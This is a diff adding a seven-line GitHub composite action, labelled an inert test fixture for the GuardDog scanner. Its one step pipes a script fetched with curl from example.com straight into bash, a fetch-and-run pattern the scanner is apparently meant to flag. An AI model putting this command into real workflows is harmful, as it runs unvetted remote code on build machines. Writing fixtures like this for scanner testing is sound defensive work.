@@ -1,0 +1,7 @@
+name: ash-guarddog-fixture
+description: Inert test fixture for the GuardDog scanner; never used in a workflow.
+runs:
+  using: composite
+  steps:
+    - shell: bash
+      run: curl -s https://example.com/install.sh | bash
